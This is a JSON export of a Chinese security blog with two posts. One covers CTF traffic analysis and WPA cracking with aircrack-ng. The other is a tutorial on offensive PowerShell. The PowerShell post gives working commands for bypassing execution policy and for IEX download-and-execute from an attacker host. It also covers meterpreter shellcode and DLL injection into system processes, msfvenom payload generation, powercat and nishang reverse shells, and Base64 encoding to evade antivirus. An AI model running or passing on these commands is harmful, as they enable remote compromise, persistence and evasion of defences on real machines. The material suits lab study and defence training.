{"meta":{"title":"steady's blog","subtitle":"深山夕照深秋雨。","description":"热爱web安全，主攻渗透测试，目前正在着力于web开发与内网渗透，同时也是一个CTFer。","author":"steady","url":"http://s1eady.top","root":"/"},"pages":[{"title":"categories","date":"2020-11-15T09:16:00.000Z","updated":"2020-11-15T09:16:27.748Z","comments":true,"path":"categories/index.html","permalink":"http://s1eady.top/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-11-15T09:15:50.000Z","updated":"2020-11-15T09:16:42.406Z","comments":true,"path":"tags/index.html","permalink":"http://s1eady.top/tags/index.html","excerpt":"","text":""},{"title":"关于","date":"2020-11-15T09:42:19.150Z","updated":"2020-10-02T07:27:50.831Z","comments":false,"path":"about/index.html","permalink":"http://s1eady.top/about/index.html","excerpt":"","text":"123456789101112131415161718192021&#123; name: &#x27;steady&#x27; age: 21, gender: &#x27;男&#x27;, profession: &#x27;Penetration Testing&#x27;, education: &#x27;本科&#x27;, email: &#x27;steady_boy@163.com&#x27;, description: &#x27;热爱web安全，擅长渗透测试、漏洞挖掘、内网渗透。&#x27;, skills: [ [&#x27;Python&#x27;, &#x27;Javascript&#x27;, &#x27;[Php]&#x27;, &#x27;Java&#x27;], [&#x27;web安全&#x27;, &#x27;渗透测试&#x27;], [&#x27;内网渗透&#x27;,&#x27;应急响应&#x27;], [&#x27;Linux&#x27;, &#x27;代码审计&#x27;], ], devTools: [ [&#x27;Xray&#x27;, &#x27;AWVS&#x27;, &#x27;BurpSuite&#x27;], [&#x27;metasploit&#x27;, &#x27;Fiddler&#x27;] ] &#125;"},{"title":"search","date":"2020-11-15T09:17:19.000Z","updated":"2020-11-15T09:17:36.421Z","comments":true,"path":"search/index.html","permalink":"http://s1eady.top/search/index.html","excerpt":"","text":""}],"posts":[{"title":"流量分析--Wireshark使用","slug":"流量分析--Wireshark使用","date":"2020-11-22T02:11:12.000Z","updated":"2020-11-06T11:22:21.348Z","comments":true,"path":"2020/11/22/流量分析--Wireshark使用/","link":"","permalink":"http://s1eady.top/2020/11/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--Wireshark%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Wireshark文件导出功能http导出功能 foremost分离1foremost 1.jpg tcpxtract12steady@steady:~&#x2F;桌面&#x2F;steady$ tcpxtract -f &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;attachment.pcapngFound file of type &quot;zip&quot; in session [192.168.56.2:4244 -&gt; 192.168.56.104:23825], exporting to 00000000.zip NetworkMiner 分析TCPtcpick由于网络通信协议众多，TCP连接状态众多，所以TCP分析较为复杂。Kali Linux提供一款专用工具tcpick。该工具支持在线实时嗅探和离线文件嗅探。它可以自动过滤出TCP流，并列出不同出TCP的相关信息，如源和目标地址/端口号、连接状态。该工具可以自动重组流数据，按照不同的格式进行保存。同时，该工具可以在终端以多种显示重组前和重组后的数据包内容，便于用户进行分析。 12345678910111213141516171819202122232425262728steady@steady:~/桌面/steady$ /usr/sbin/tcpick -C -yP -r attachment.pcapngStarting tcpick 0.2.1 at 2020-11-05 18:42 CSTTimeout for connections is 600tcpick: reading from attachment.pcapng1 SYN-SENT 192.168.56.2:55366 &gt; 192.168.56.104:44441 SYN-RECEIVED 192.168.56.2:55366 &gt; 192.168.56.104:44441 ESTABLISHED 192.168.56.2:55366 &gt; 192.168.56.104:4444nc -l -p 4445 &gt; flag.zip2 SYN-SENT 192.168.56.2:37904 &gt; 192.168.56.104:44452 SYN-RECEIVED 192.168.56.2:37904 &gt; 192.168.56.104:44452 ESTABLISHED 192.168.56.2:37904 &gt; 192.168.56.104:4445PK.... ...NdbN..,.%...........flag.txtUT ....z\\..z\\ux...............(.y..z.. ..F.......:...#B z..:...YPK....,.%.......PK...... ...NdbN..,.%.........................flag.txtUT.....z\\ux.............PK..........N...w..... 2 FIN-WAIT-1 192.168.56.2:37904 &gt; 192.168.56.104:44452 FIN-WAIT-2 192.168.56.2:37904 &gt; 192.168.56.104:44452 TIME-WAIT 192.168.56.2:37904 &gt; 192.168.56.104:44452 CLOSED 192.168.56.2:37904 &gt; 192.168.56.104:4445unzip -P supercomplexpassword flag.zipArchive: flag.zip inflating: flag.txt 1 FIN-WAIT-1 192.168.56.2:55366 &gt; 192.168.56.104:44441 TIME-WAIT 192.168.56.2:55366 &gt; 192.168.56.104:44441 CLOSED 192.168.56.2:55366 &gt; 192.168.56.104:4444tcpick: done reading from attachment.pcapng24 packets captured 2 tcp sessions detected tcpdump三次握手123client -&gt; server: SYNserver -&gt; client: SYN+ACKclient -&gt; server: ACK 12302:52:44.513700 IP 172.17.0.9.41038 &gt; 93.184.216.34.80: Flags [S] , seq 3310420140, length 002:52:44.692890 IP 93.184.216.34.80 &gt; 172.17.0.9.41038: Flags [S.], seq 1353235534, ack 3310420141, length 002:52:44.692953 IP 172.17.0.9.41038 &gt; 93.184.216.34.80: Flags [.] , ack 1353235535, length 0 第一次握手: SYN#1 包含以下信息： 02:52:44.513700 时刻，客户端主动向 server（93.184.216.34）发起一个 SYN 请求，请求建立连接 客户端请求的服务端端口是 80（HTTP 服务默认 80 端口），客户端使用的是临时端口（大于 1024）41038 #1 序列号是 3310420140，这是客户端的初始序列号（客户端和服务端分别维护自己的序列号，两者没有关系；另外，初始序列号是系统选择的，一般不是 0） #1 length 为 0，因为 SYN 包不带 TCP payload，所有信息都在 TCP header 第二次握手: SYN+ACK#2 的 ack 是 3310420140，等于 #1 的 seq 加 1，这就说明，#2 是 #1 的应 答包。 这个应答包的特点： TCP flags 为 S.，即 SYN+ACK length 也是 0，说明没有 payload seq 为 1353235534，这是服务端的初始序列号 到达 eth0 的时间为 02:52:44.692890，说明时间过了 18ms 第三次握手: ACK同理，#3 的 ack 等于 #2 的 seq 加 1，说明 #3 是 #2 的应答包。 这个包的特点： TCP flags 为 .，即 ACK 长度为 0，说明没有 TCP payload 至此，三次握手完成。 1234567steady@steady:~/桌面/steady$ /usr/sbin/tcpdump -n -r nmapll.pcapng &#x27;tcp[13] = 18&#x27; | awk &#x27;&#123;print $3&#125;&#x27;| sort -ureading from file nmapll.pcapng, link-type EN10MB (Ethernet)127.0.0.1.21127.0.0.1.22127.0.0.1.3306127.0.0.1.631127.0.0.1.801 1234567steady@steady:~/桌面/steady$ /usr/sbin/tcpdump -r nmapll.pcapng &#x27;tcp[13] = 18&#x27; | awk &#x27;&#123;print $3&#125;&#x27;| sort -ureading from file nmapll.pcapng, link-type EN10MB (Ethernet)localhost.801localhost.ftplocalhost.ipplocalhost.mysqllocalhost.ssh 输出分析1steady@steady:~&#x2F;桌面&#x2F;steady$ tcpdump -r attachment.pcapng | head -n 10 114:29:32.848771 IP 192.168.10.212.43424 &gt; li370-223.members.linode.com.https: Flags [S], seq 3990734865, win 29200, options [mss 1460,sackOK,TS val 668024057 ecr 0,nop,wscale 7], length 0 packet 时间戳，例如 02:52:44.513700 表示抓到这个包的时间是** 02 时 52 分 44 秒 513 毫秒** packet 类型，这里是 IP 包 源 (SRC) IP 和端口，目的 (DST) IP 和端口 packet TCP flags，其中 S 表示 syn 包 . 表示 ack 包 F 表示 fin 包 P 表示 push 包（发送正常数据） 序列号（seq） 应答号（ack） 包的 payload 长度 包的部分内容（ASCII） 参数123-n 不对地址(比如, 主机地址, 端口号)进行数字表示到名字表示的转换.默认情况下，tcpdump抓包结果中将进行域名解析，显示的是域名地址而非ip地址，使用-n选项，可指定显示ip地址-r file 从文件file 中读取包数据. 如果file 字段为 &#39;-&#39; 符号, 则tcpdump 会从标准输入中读取包数据. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130-A 以ASCII码方式显示每一个数据包(不会显示数据包中链路层头部信息). 在抓取包含 网页数据的数据包时, 可方便查看数据(nt: 即Handy for capturing web pages).-c count tcpdump将在接受到count个数据包后退出.-C file-size (nt: 此选项用于配合-w file 选项使用) 该选项使得tcpdump 在把原始数据包直接保存到文件中之前, 检查此文件大小是否超过file-size. 如果超过了, 将关闭此文件, 另创一个文件继续用于原始数据包的记录. 新创建的文件名与-w 选项指定的文件名一致, 但文件名后多了一个数字. 该数字会从1开始随着新创建文件的增多而增加. file-size的单位是百万字节(nt: 这里指1,000,000个字节, 并非1,048,576个字节, 后者是以1024字节为1k, 1024k字节为1M计算所得, 即1M=1024 ＊ 1024 ＝ 1,048,576)-d 以容易阅读的形式,在标准输出上打印出编排过的包匹配码, 随后tcpdump停止.(nt | rt: human readable, 容易阅读的, 通常是指以ascii码来打印一些信息. compiled, 编排过的. packet-matching code, 包匹配码,含义未知, 需补充)-dd 以C语言的形式打印出包匹配码.-ddd 以十进制数的形式打印出包匹配码(会在包匹配码之前有一个附加的&#x27;count&#x27;前缀).-D 打印系统中所有tcpdump可以在其上进行抓包的网络接口. 每一个接口会打印出数字编号, 相应的接口名字, 以及可能的一个网络接口 描述. 其中网络接口名字和数字编号可以用在tcpdump 的-i flag 选项(nt: 把名字或数字代替flag), 来指定要在其上抓包的网络 接口. 此选项在不支持接口列表命令的系统上很有用(nt: 比如, Windows 系统, 或缺乏 ifconfig -a 的UNIX系统); 接口的数字 编号在windows 2000 或其后的系统中很有用, 因为这些系统上的接口名字比较复杂, 而不易使用. 如果tcpdump编译时所依赖的libpcap库太老,-D 选项不会被支持, 因为其中缺乏 pcap_findalldevs()函数.-e 每行的打印输出中将包括数据包的数据链路层头部信息-E spi@ipaddr algo:secret,... 可通过spi@ipaddr algo:secret 来解密IPsec ESP包(nt | rt:IPsec Encapsulating Security Payload, IPsec 封装安全负载, IPsec可理解为, 一整套对ip数据包的加密协议, ESP 为整个IP 数据包或其中上层协议部分被加密后的数据, 前者的工作模式称为隧道模式; 后者的工作模式称为传输模式 . 工作原理, 另需补充). 需要注意的是, 在终端启动tcpdump 时, 可以为IPv4 ESP packets 设置密钥(secret）. 可用于加密的算法包括des-cbc, 3des-cbc, blowfish-cbc, rc3-cbc, cast128-cbc, 或者没有(none). 默认的是des-cbc(nt: des, Data Encryption Standard, 数据加密标准, 加密算法未知, 另需补充). secret 为用于ESP 的密钥, 使用ASCII 字符串方式表达. 如果以 0x 开头, 该密钥将以16进制方式读入. 该选项中ESP 的定义遵循RFC2406, 而不是 RFC1827. 并且, 此选项只是用来调试的, 不推荐以真实密钥(secret)来 使用该选项, 因为这样不安全: 在命令行中输入的secret 可以被其他人通过ps 等命令查看到. 除了以上的语法格式(nt: 指spi@ipaddr algo:secret), 还可以在后面添加一个语法输入文件名字供tcpdump 使用 (nt：即把spi@ipaddr algo:secret,... 中...换成一个语法文件名). 此文件在接受到第一个ESP 包时会打开此 文件, 所以最好此时把赋予tcpdump 的一些特权取消(nt: 可理解为, 这样防范之后, 当该文件为恶意编写时, 不至于造成过大损害).-f 显示外部的IPv4 地址时(nt: foreign IPv4 addresses, 可理解为, 非本机ip地址), 采用数字方式而不是名字. (此选项是用来对付Sun公司的NIS服务器的缺陷(nt: NIS, 网络信息服务, tcpdump 显示外部地址的名字时会 用到她提供的名称服务): 此NIS服务器在查询非本地地址名字时,常常会陷入无尽的查询循环). 由于对外部(foreign)IPv4地址的测试需要用到本地网络接口(nt: tcpdump 抓包时用到的接口) 及其IPv4 地址和网络掩码. 如果此地址或网络掩码不可用, 或者此接口根本就没有设置相应网络地址和网络 掩码(nt: linux 下的 &#x27;any&#x27; 网络接口就不需要设置地址和掩码, 不过此&#x27;any&#x27;接口可以收到系统中所有接口的 数据包), 该选项不能正常工作.-F file 使用file 文件作为过滤条件表达式的输入, 此时命令行上的输入将被忽略.-i interface 指定tcpdump 需要监听的接口. 如果没有指定, tcpdump 会从系统接口列表中搜寻编号最小的已配置好的接口(不包括 loopback 接口). 一但找到第一个符合条件的接口, 搜寻马上结束. 在采用2.2版本或之后版本内核的Linux 操作系统上, &#x27;any&#x27; 这个虚拟网络接口可被用来接收所有网络接口上的数据包 (nt: 这会包括目的是该网络接口的, 也包括目的不是该网络接口的). 需要注意的是如果真实网络接口不能工作在&#x27;混杂&#x27;模式(promiscuous)下, 则无法在&#x27;any&#x27;这个虚拟的网络接口上抓取其数据包. 如果 -D 标志被指定, tcpdump会打印系统中的接口编号，而该编号就可用于此处的interface 参数.-l 对标准输出进行行缓冲(nt: 使标准输出设备遇到一个换行符就马上把这行的内容打印出来). 在需要同时观察抓包打印以及保存抓包记录的时候很有用. 比如, 可通过以下命令组合来达到此目的: ``tcpdump -l | tee dat&#x27;&#x27; 或者 ``tcpdump -l &gt; dat &amp; tail -f dat&#x27;&#x27;. (nt: 前者使用tee来把tcpdump 的输出同时放到文件dat和标准输出中, 而后者通过重定向操作&#x27;&gt;&#x27;, 把tcpdump的输出放到 dat 文件中, 同时通过tail把dat文件中的内容放到标准输出中)-L 列出指定网络接口所支持的数据链路层的类型后退出.(nt: 指定接口通过-i 来指定)-m module 通过module 指定的file 装载SMI MIB 模块(nt: SMI，Structure of Management Information, 管理信息结构 MIB, Management Information Base, 管理信息库. 可理解为, 这两者用于SNMP(Simple Network Management Protoco) 协议数据包的抓取. 具体SNMP 的工作原理未知, 另需补充). 此选项可多次使用, 从而为tcpdump 装载不同的MIB 模块.-M secret 如果TCP 数据包(TCP segments)有TCP-MD5选项(在RFC 2385有相关描述), 则为其摘要的验证指定一个公共的密钥secret.-n 不对地址(比如, 主机地址, 端口号)进行数字表示到名字表示的转换.-N 不打印出host 的域名部分. 比如, 如果设置了此选现, tcpdump 将会打印&#x27;nic&#x27; 而不是 &#x27;nic.ddn.mil&#x27;.-O 不启用进行包匹配时所用的优化代码. 当怀疑某些bug是由优化代码引起的, 此选项将很有用.-p 一般情况下, 把网络接口设置为非&#x27;混杂&#x27;模式. 但必须注意 , 在特殊情况下此网络接口还是会以&#x27;混杂&#x27;模式来工作； 从而, &#x27;-p&#x27; 的设与不设, 不能当做以下选现的代名词: &#x27;ether host &#123;local-hw-add&#125;&#x27; 或 &#x27;ether broadcast&#x27;(nt: 前者表示只匹配以太网地址为host 的包, 后者表示匹配以太网地址为广播地址的数据包).-q 快速(也许用&#x27;安静&#x27;更好?)打印输出. 即打印很少的协议相关信息, 从而输出行都比较简短.-R 设定tcpdump 对 ESP/AH 数据包的解析按照 RFC1825而不是RFC1829(nt: AH, 认证头, ESP， 安全负载封装, 这两者会用在IP包的安全传输机制中). 如果此选项被设置, tcpdump 将不会打印出&#x27;禁止中继&#x27;域(nt: relay prevention field). 另外, 由于ESP/AH规范中没有规定ESP/AH数据包必须拥有协议版本号域, 所以tcpdump不能从收到的ESP/AH数据包中推导出协议版本号.-r file 从文件file 中读取包数据. 如果file 字段为 &#x27;-&#x27; 符号, 则tcpdump 会从标准输入中读取包数据.-S 打印TCP 数据包的顺序号时, 使用绝对的顺序号, 而不是相对的顺序号.(nt: 相对顺序号可理解为, 相对第一个TCP 包顺序号的差距, 比如, 接受方收到第一个数据包的绝对顺序号为232323, 对于后来接收到的第2个,第3个数据包, tcpdump会打印其序列号为1, 2分别 表示与第一个数据包的差距为1 和 2. 而如果此时-S 选项被设置, 对于后来接收到的第2个, 第3个数据包会打印出其绝对顺序号: 232324, 232325).-s snaplen 设置tcpdump的数据包抓取长度为snaplen, 如果不设置默认将会是68字节(而支持网络接口分接头(nt: NIT, 上文已有描述, 可搜索&#x27;网络接口分接头&#x27;关键字找到那里)的SunOS系列操作系统中默认的也是最小值是96). 68字节对于IP, ICMP(nt: Internet Control Message Protocol, 因特网控制报文协议), TCP 以及 UDP 协议的报文已足够, 但对于名称服务(nt: 可理解为dns, nis等服务), NFS服务相关的 数据包会产生包截短. 如果产生包截短这种情况, tcpdump的相应打印输出行中会出现&#x27;&#x27;[|proto]&#x27;&#x27;的标志（proto 实际会显示为 被截短的数据包的相关协议层次). 需要注意的是, 采用长的抓取长度(nt: snaplen比较大), 会增加包的处理时间, 并且会减少 tcpdump 可缓存的数据包的数量， 从而会导致数据包的丢失. 所以, 在能抓取我们想要的包的前提下, 抓取长度越小越好. 把snaplen 设置为0 意味着让tcpdump自动选择合适的长度来抓取数据包.-T type 强制tcpdump按type指定的协议所描述的包结构来分析收到的数据包. 目前已知的type 可取的协议为: aodv (Ad-hoc On-demand Distance Vector protocol, 按需距离向量路由协议, 在Ad hoc(点对点模式)网络中使用), cnfp (Cisco NetFlow protocol), rpc(Remote Procedure Call), rtp (Real-Time Applications protocol), rtcp (Real-Time Applications con-trol protocol), snmp (Simple Network Management Protocol), tftp (Trivial File Transfer Protocol, 碎文件协议), vat (Visual Audio Tool, 可用于在internet 上进行电 视电话会议的应用层协议), 以及wb (distributed White Board, 可用于网络会议的应用层协议).-t 在每行输出中不打印时间戳-tt 不对每行输出的时间进行格式处理(nt: 这种格式一眼可能看不出其含义, 如时间戳打印成1261798315)-ttt tcpdump 输出时, 每两行打印之间会延迟一个段时间(以毫秒为单位)-tttt 在每行打印的时间戳之前添加日期的打印-u 打印出未加密的NFS 句柄(nt: handle可理解为NFS 中使用的文件句柄, 这将包括文件夹和文件夹中的文件)-U 使得当tcpdump在使用-w 选项时, 其文件写入与包的保存同步.(nt: 即, 当每个数据包被保存时, 它将及时被写入文件中, 而不是等文件的输出缓冲已满时才真正写入此文件) -U 标志在老版本的libcap库(nt: tcpdump 所依赖的报文捕获库)上不起作用, 因为其中缺乏pcap_cump_flush()函数.-v 当分析和打印的时候, 产生详细的输出. 比如, 包的生存时间, 标识, 总长度以及IP包的一些选项. 这也会打开一些附加的包完整性 检测, 比如对IP或ICMP包头部的校验和.-vv 产生比-v更详细的输出. 比如, NFS回应包中的附加域将会被打印, SMB数据包也会被完全解码.-vvv 产生比-vv更详细的输出. 比如, telent 时所使用的SB, SE 选项将会被打印, 如果telnet同时使用的是图形界面, 其相应的图形选项将会以16进制的方式打印出来(nt: telnet 的SB,SE选项含义未知, 另需补充).-w 把包数据直接写入文件而不进行分析和打印输出. 这些包数据可在随后通过-r 选项来重新读入并进行分析和打印.-W filecount 此选项与-C 选项配合使用, 这将限制可打开的文件数目, 并且当文件数据超过这里设置的限制时, 依次循环替代之前的文件, 这相当 于一个拥有filecount 个文件的文件缓冲池. 同时, 该选项会使得每个文件名的开头会出现足够多并用来占位的0, 这可以方便这些 文件被正确的排序.-x 当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以16进制打印出每个包的数据(但不包括连接层的头部). 总共打印的数据大小不会超过整个数据包的大小与snaplen 中的最小值. 必须要注意的是, 如果高层协议数据没有snaplen 这么长, 并且数据链路层(比如, Ethernet层)有填充数据, 则这些填充数据也会被打印.(nt: so for link layers that pad, 未能衔接理解和翻译, 需补充 )-xx tcpdump 会打印每个包的头部数据, 同时会以16进制打印出每个包的数据, 其中包括数据链路层的头部.-X 当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以16进制和ASCII码形式打印出每个包的数据(但不包括连接层的头部). 这对于分析一些新协议的数据包很方便.-XX 当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以16进制和ASCII码形式打印出每个包的数据, 其中包括数据链路层的头部. 这对于分析一些新协议的数据包很方便.-y datalinktype 设置tcpdump 只捕获数据链路层协议类型是datalinktype的数据包-Z user 使tcpdump 放弃自己的超级权限(如果以root用户启动tcpdump, tcpdump将会有超级用户权限), 并把当前tcpdump的 用户ID设置为user, 组ID设置为user首要所属组的ID(nt: tcpdump 此处可理解为tcpdump 运行之后对应的进程) 此选项也可在编译的时候被设置为默认打开.(nt: 此时user 的取值未知, 需补充) Tcpdump常用命令实例 不可见的图层 Adobe的元数据格式‘XMP’ Adobe的XMP元数据 PDF的‘增量生成’功能允许保留用户不可见的前版本信息 白色的文字或背景图 图片背后的文字信息 图层后面被覆盖的另一个图层 不显示的注释层。 Wifi破解12aircrack-ng ctf.pcap -w /usr/share/wordlists/rockyou.txtairdecap-ng ctf.pcap -e ctf -p password1 123456789101112131415161718192021222324252627282930steady@steady:~&#x2F;桌面&#x2F;steady$ aircrack-ng -w passwd.txt shipin.capReading packets, please wait...Opening shipin.capRead 16664 packets. # BSSID ESSID Encryption 1 00:1D:0F:5D:D0:EE 0719 WPA (1 handshake)Choosing first network as target.Reading packets, please wait...Opening shipin.capRead 16664 packets.1 potential targets Aircrack-ng 1.6 [00:00:00] 1&#x2F;1 keys tested (37.17 k&#x2F;s) Time left: -- KEY FOUND! [ 88888888 ] Master Key : B4 30 38 0F 24 7B 57 AC DE B5 3A 7F 2E FE 6B 45 0B 34 02 C3 89 F9 69 D5 B7 35 87 1B FB 4C EE 7F Transient Key : 17 AE 23 D0 69 7C 0D 45 2B 40 F6 7D 06 C9 C5 6F 25 F0 B0 48 7A 6C 22 7C E2 73 50 71 46 FE 5D 0C 8F 59 01 BE 66 56 DF 1E 58 DD 34 DB BF A7 2D FD 2C 53 11 7F B2 E5 F0 16 7F 57 F5 6A 04 36 F5 71 EAPOL HMAC : 75 19 C5 F3 3E 33 58 23 CA 4B A1 85 FB 46 C0 2A 123456789101112131415161718steady@steady:~&#x2F;桌面&#x2F;steady$ aircrack-ng &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;shipin.capReading packets, please wait...Opening &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;shipin.capRead 16664 packets.#注意ESSID # BSSID ESSID Encryption 1 00:1D:0F:5D:D0:EE 0719 WPA (1 handshake)Choosing first network as target.Reading packets, please wait...Opening &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;shipin.capRead 16664 packets.1 potential targetsPlease specify a dictionary (option -w). -e后面的为ESSID。 1234567891011steady@steady:~/桌面/steady$ airdecap-ng -e 0719 -p 88888888 shipin.capTotal number of stations seen 6Total number of packets read 16664Total number of WEP data packets 0Total number of WPA data packets 27Number of plaintext data packets 0Number of decrypted WEP packets 0Number of corrupted WEP packets 0Number of decrypted WPA packets 16Number of bad TKIP (WPA) packets 0Number of bad CCMP (WPA) packets 0 之后会解出来一个压缩包。","categories":[{"name":"CTF-流量分析","slug":"CTF-流量分析","permalink":"http://s1eady.top/categories/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"CTF-流量分析","slug":"CTF-流量分析","permalink":"http://s1eady.top/tags/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}]},{"title":"内网学习--Powershell使用","slug":"内网学习--Powershell","date":"2020-11-20T20:14:26.000Z","updated":"2020-11-21T08:14:57.442Z","comments":true,"path":"2020/11/21/内网学习--Powershell/","link":"","permalink":"http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/","excerpt":"","text":"PowershellPowershell基本概念Windows PowerShell是一种命令行外壳程序和脚本环境，可以看作是命令行提示符cmd.exe的扩展，其使命令行用户和脚本编写者可以利用.NET Framework的强大功能。只要可以在一台计算机上运行代码，就可以将PowerShell脚本文件（.ps1）下载到磁盘中执行（甚至无须将脚本文件写到磁盘中）。 Powershell特点 在Windows 7以上版本是默认安装的； 脚本可以在内存中运行，不需要写入磁盘； 几乎不会触发杀毒软件； 可远程执行； 目前很多工具都是局域PowerShell开发的； 使Windows脚本的执行更为容易； cmd.exe的运行通常会被阻止，但PowerShell的运行通常不会被阻止； 可用于管理活动目录； Powershell执行策略为了防止使用者运行恶意脚本，PowerShell提供了一个执行策略。在默认情况下，这个执行策略被设置为“不能运行”。 使用如下的cmdlet命令查询当前的执行策略： 12PS E:\\&gt; Get-ExecutionPolicyRestricted 常见的执行策略值 Restricted：脚本不能运行（默认设置）； RemoteSigned：在本地创建的脚本可以运行，但不能运行网上下载的脚本（拥有数字证书的除外）； AllSigned：仅当脚本由受信任的发布者签名时才能运行； Unrestricted：允许所有脚本运行； 使用下面的cmdlet命令设置PowerShell的执行策略： 1PS E:\\&gt; Set-ExecutionPolicy &lt;policy name&gt; 绕过执行策略PowerSploit是一款基于PowerShell的后渗透测试框架，其中包含很多PowerShell脚本，主要用于渗透测试中的信息收集、权限提升、权限维持。 想运行PowerShell脚本，必须使用管理员权限将执行策略从Restricted改为Unrestricted。 Bypass本地权限并执行 将PowerShell脚本文件test.ps1上传至目标服务器。在命令行环境下，执行如下命令，绕过安全策略，在目标服务器本地执行该脚本： 1PowerShell.exe -ExecutionPolicy Bypass -File test.ps1 用iex下载远程PS1脚本绕过权限执行 1PowerShell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString(&quot;xxx.ps1&quot;);[Parameters] PowerSploitPowerSploit基本概念PowerSploit是GitHub上面的一个安全项目，上面有很多powershell攻击脚本，它们主要被用来渗透中的信息侦察、权限提升、权限维持。 PowerSploit特点1.代码运行在内存中可以不去接触磁盘 2.从另一个系统中下载代码并执行 3.很多安全产品并不能监测到powershell的活动 4.cmd.exe通常被阻止运行，但是powershell不会 PowerSploit下载Github下载之后，我们放到攻击机的web目录，以便于在目标机器的powershell中下载对应的利用脚本。 PowerSploit模块 CodeExecution模块–Invoke-Shellcode脚本 直接执行shellcode反弹meterpreter shell 利用msfvenom生成一个反弹木马，以供invoke-shellcode注入。 调用目标机的powershell进行IEX远程下载invoke-shellcode脚本和生成的木马。 12IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;PowerSploit&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1&quot;) 下载生成好的木马 1PS C:\\Users\\Administrator&gt; IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;code&quot;) kali设置msf监听 在powershell中调用invoke-shellcode 1PS C:\\Users\\Administrator&gt; Invoke-Shellcode -Shellcode $buf -Force 指定进程注入shellcode反弹meterpreter shell 下载ps脚本和木马 123IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;PowerSploit&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1&quot;)PS C:\\Users\\Administrator&gt; IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;code&quot;) 选择注入的进程—直接选择系统进程，因为如果我们的进程关闭，我们的会话也会关闭，系统进程一般不回被关闭。常见系统进程 1explorer进程(Windows程序管理器或者文件资源管理器) Get-Process或者ps命令查看当前所有的进程。 ps -Name explorer查看某一个进程的PID。 注入id为1228的进程 1Invoke-Shellcode -Shellcode $buf -ProcessID 1228 -Force调用invoke-dllinjection将DLL注入到进程中。 CodeExecution模块–调用invoke-dllinjection将DLL注入到进程中 msf生成dll文件 1msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.190.141 lport&#x3D;4444 -f dll -o &#x2F;var&#x2F;www&#x2F;html&#x2F;code.dll Powershel 下载dllinjection文件 12PS C:\\Users\\Administrator&gt; IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;PowerSploit&#x2F;CodeExecution&#x2F;Invoke-DllInjection.ps1&quot;) 将dll注入到某一个进程 1PS C:\\Users\\Administrator&gt; Invoke-DllInjection -Dll .\\code.dll -ProcessID 2700 powershell反弹shell常见方式 powercat反弹shell powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat 。 下载脚本文件 1powershell IEX (New-Object System.Net.Webclient).DownloadString (&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;); 反弹shell 1powercat -c 192.168.159.134 -p 6666 -e cmd nishang反弹shell Nishang是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。 反弹TCPshell 1powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com &#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666 自定义powershell函数反弹shell 反弹UDPshell 1powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.134&#x2F;nishang&#x2F;Shells&#x2F;Invoke-PowerShellUdp.ps1&#39;); Invoke-PowerShellUdp -Reverse -IPAddress 192.168.159.134 -port 53 使用Base64对PowerShell命令进行编码使用Base64编码PowerShell命令可以起到混淆和压缩代码的作用，避免一些特殊字符导致脚本被杀毒软件所查杀。 使用一个Python脚本文件ps_encoder.py，其使用Base64编码封装的PowerShell命令包，其目的是混淆和压缩代码。 将payload输入到文件中 1root@kali:~&#x2F;Desktop# echo &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;cheetz&#x2F;PowerSploit&#x2F;master&#x2F;CodeExecution&#x2F;Invoke--Shellcode.ps1&#39;); Invoke-Shellcode -Payload windows&#x2F;meterpreter&#x2F;reverse_https -Lhost 192.168.10.137 -Lport 666 -Force&quot; &gt;raw.txt 使用脚本对其编码 123root@kali:~&#x2F;Desktop# python ps_encoder.py -s 